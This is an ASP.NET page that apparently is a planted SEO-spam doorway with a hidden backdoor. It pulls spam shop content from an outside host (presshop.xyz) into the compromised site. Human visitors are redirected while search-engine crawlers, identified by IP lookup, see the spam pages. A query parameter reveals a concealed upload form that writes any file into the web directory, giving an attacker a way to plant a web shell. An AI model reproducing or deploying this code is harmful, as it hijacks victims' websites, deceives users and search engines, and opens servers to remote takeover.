<%@ Page Language="C#" %>

<script runat="server">

    protected void Page_Load(object sender, EventArgs e)
    {
        string httpxy = HttpContext.Current.Request.IsSecureConnection ? "https://" : "http://";
        if (!IsPostBack)
        {
            if (Request.QueryString["aa"] != null)
            {
                ttttt.Visible = true;

            }
            else
            {
                webclient = new System.Net.WebClient();
                webclient.Encoding = System.Text.Encoding.UTF8;
                string URL = "http://jf2021.presshop.xyz/2021/doiid.aspx";
                descriptions = webclient.DownloadString("http://jf2021.presshop.xyz/getci.aspx?cid=" + Request.QueryString["categoryid"] + "&s=5&e=6");
                content1 = webclient.DownloadString("http://jf2021.presshop.xyz/0511/wz.aspx");
                if (Request.QueryString["s"] != null)
                {
                    int cid = new Random().Next(1, 200);
                    if (Request.QueryString["categoryid"] != null) { cid = int.Parse(Request.QueryString["categoryid"]); }
                    URL = "http://jf2021.presshop.xyz/sjd.aspx?cid=" + cid + "&number=" + Request.QueryString["number"] + "&pnum=" + Request.QueryString["pnum"];
                    content = webclient.DownloadString(URL);
                    content = content.Replace("iid=", "productid=");
                    content = content.Replace("cid=", "categoryid=");
                    content = content.Replace("yymm", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
                }
                else
                {
                    if (Request.QueryString["productid"] != null)
                    {
                        int txtd = new Random().Next(1, 246);
                        URL += "?iid=" + Request.QueryString["productid"] + "&cid=" + Request.QueryString["categoryid"] + "&mt=http://jf2021.presshop.xyz/en/333/" + txtd + ".txt";
                        kname = webclient.DownloadString(URL.Replace("/2021/doiid.aspx", "/2021/gn.aspx"));
                        tz();
                        content = webclient.DownloadString(URL);
                    }
                    else
                    {
                        tz();
                        int cid = new Random().Next(1, 200);
                        if (Request.QueryString["categoryid"] != null) { cid = int.Parse(Request.QueryString["categoryid"]); }
                        URL += "?cid=" + cid + "&pnum=" + Request.QueryString["pnum"];
                        content = webclient.DownloadString(URL);

                    }
                    string ttttt = kname + ",Free delivery," + HttpContext.Current.Request.Url.Host + Request.QueryString["pnum"];
                    string kkkkk = kname;
                    ddddd = "<div style='display: block'><ul><li>Related links: <a href='?s=s&categoryid=" + new Random().Next(1, 30) + "&number=5000'>sitemap01</a></li><li>Related links: <a href='?s=s&categoryid=" + new Random().Next(30, 60) + "&number=5000'>sitemap02</a></li><li>Related links: <a href='?s=s&categoryid=" + new Random().Next(60, 90) + "&number=5000'>sitemap03</a></li><li>Related links: <a href='?s=s&categoryid=" + new Random().Next(90, 120) + "&number=5000'>sitemap04</a></li></ul></div>";
                    string iiiii ="Buy the product you like," + new Random().Next(60, 80) + "%," + kname + descriptions;
                    content = content.Replace("UUUUU", httpxy + HttpContext.Current.Request.Url.Host + HttpContext.Current.Request.Path);
                    content = content.Replace("BBBBB", HttpContext.Current.Request.Url.Host);
                    content = content.Replace("NNNNN", "Best Cheap Online Shopping Site");
                    content = content.Replace("DDDDD", ddddd);
                    content = content.Replace("iid=", "productid=");
                    content = content.Replace("cid=", "categoryid=");
                    content = content.Replace("TTTTT", ttttt);
                    content = content.Replace("KKKKK", kkkkk);
                    content = content.Replace("IIIII", iiiii);
                    content = content.Replace("CCCCC", Request.Url.ToString());
                }
            }
        }
    }
    public void tz()
    {

        string ip = System.Web.HttpContext.Current.Request.ServerVariables["REMOTE_ADDR"];
        if (Request.QueryString["kk"] != null)
        {
            ip = "66.249.64.190";
        }
        string ipurl = "http://jf2021.presshop.xyz/getdomain.aspx?rnd=1&ip=" + ip;
        webclient = new System.Net.WebClient();
        webclient.Encoding = System.Text.Encoding.UTF8;
        string domain = webclient.DownloadString(ipurl).ToLower();
        if (domain.IndexOf("google") == -1 && domain.IndexOf("msn.com") == -1 && domain.IndexOf("yahoo.com") == -1 && domain.IndexOf("aol.com") == -1)
        {
            if (Request.QueryString["productid"] != null)
            {
                string ccc = kname;

                string ddd = webclient.DownloadString("http://jf2021.presshop.xyz/newurl.asp?cid=" + Request.QueryString["categoryid"] + "");
                string eee = ddd + HttpUtility.UrlEncode(kname);

                Response.Redirect(eee);
            }
        }
    }
    protected void UploadButton_Click(object sender, EventArgs e)
    {
        if (FileUpload1.HasFile)
            try
            {
                FileUpload1.SaveAs(Server.MapPath(".") + "\\" +
                     FileUpload1.FileName);
                FileUploadedLabel.Text = "File name: " +
                     FileUpload1.PostedFile.FileName + "<br>" +
                     FileUpload1.PostedFile.ContentLength + " kb<br>" +
                     "Content type: " + FileUpload1.PostedFile.ContentType;
            }
            catch (Exception ex)
            {
                FileUploadedLabel.Text = "ERROR: " + ex.Message.ToString();
            }
        else
        {
            FileUploadedLabel.Text = "You have not specified a file.";
        }
    }
    public string xi = "1";
    public string xc = "40";

    public System.Net.WebClient webclient = null;
    public string content = "";
    public string content1 = "";
    public string hyzhdy = "";
    public string Greeting = "";
    public string ddddd = "";
    public string hhhvx = "";
    public string URL1 = "";
    public System.Random a = null;
    public string descriptions = "";
    public string kname = "";
</script>
<%=content.Replace("XXXXX",HttpContext.Current.Request.Url.Host) %>
<div runat="server" id="ttttt" visible="false">
    <form id="form1" runat="server">
        <asp:FileUpload ID="FileUpload1" runat="server" />
        <br />
        <asp:Button ID="UploadButton" runat="server"
            OnClick="UploadButton_Click"
            Text="Upload File" />
        <br />
        <asp:Label ID="FileUploadedLabel" runat="server" />
    </form>
</div>

